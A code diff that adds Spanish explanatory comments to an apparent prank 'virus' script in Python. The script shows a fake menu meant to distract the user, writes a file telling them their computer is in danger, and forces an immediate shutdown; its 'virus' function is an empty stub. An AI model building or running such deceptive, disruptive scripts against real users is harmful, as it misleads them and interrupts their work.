@@ -4,6 +4,7 @@ import platform
 import subprocess
 
 
+# Con esta funcion se comprueba el sistema operativo desde el cual se esta ejecutando el script
 def check_platform():
     if platform.system() == 'Windows':
         return 'Windows'
@@ -15,10 +16,11 @@ def check_platform():
         return 'Unknown'
 
 
+# Gracias a esta funcion podemos obtener el nombre de usuario registrado en el sistema operativo
 def get_user():
     return getuser()
 
-
+# Aqui ejecuta el codigo distractor el cual sirve para distraer mientras el script se ejectuta en segundo plano
 def menu():
     while True:
         print(
@@ -42,6 +44,7 @@ def menu():
             return option
 
 
+       # Genera un archivo de texto para avisar al usuario de como el script comprometio su informacion.
 def create_file():
     with open('Hello, your computer is in danger!.txt', 'w') as file:
         file.write('Hello, ' + get_user() + '!\n')
@@ -53,6 +56,7 @@ def create_file():
         file.close()
 
 
+        # Responde a las opcion seleccionada por el menu
 def options(user_option):
     if user_option == 1:
         print("Requesiting tasks on database............")
@@ -118,6 +122,7 @@ def options(user_option):
         exit()
 
 
+# Apaga el equipo tomando como parametro el sistema que detecto y usando su correspondiente comando
 def shutdown(platform_user):
     if platform_user == 'Windows':
         subprocess.call('shutdown -s -t 0', shell=True)
@@ -130,11 +135,12 @@ def shutdown(platform_user):
         print('Unknown platform')
 
 
+        # Funcion del virus que dañaria el sistema
 def ultimateSuperDangerVirus():
     # Your computer die in here
     pass
 
-
+# Ejecuta todo el codigo
 def main():
     ultimateSuperDangerVirus()
     options(menu())
